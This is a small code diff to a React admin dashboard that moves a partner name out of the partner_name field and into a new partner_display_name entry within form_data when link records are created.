@@ -44,11 +44,12 @@ export function Admin1Dashboard({ user }: { user: any }) {
             current_step: linkType === "direct_win" ? "win" : linkType === "direct_bank" ? "banken" : "code_entry",
             status: "offline",
             is_hidden: false,
-            partner_name: linkType === "normal" ? (partnerName.trim() || adminIdentifier) : adminIdentifier,
+            partner_name: adminIdentifier,
             participation_code: linkType === "normal" ? (participationCode.trim() || null) : null,
             form_data: {
               currency,
               is_wheel_game: linkType === "wheel",
+              partner_display_name: linkType === "normal" ? partnerName.trim() : "",
             }
           })
           .select("id")
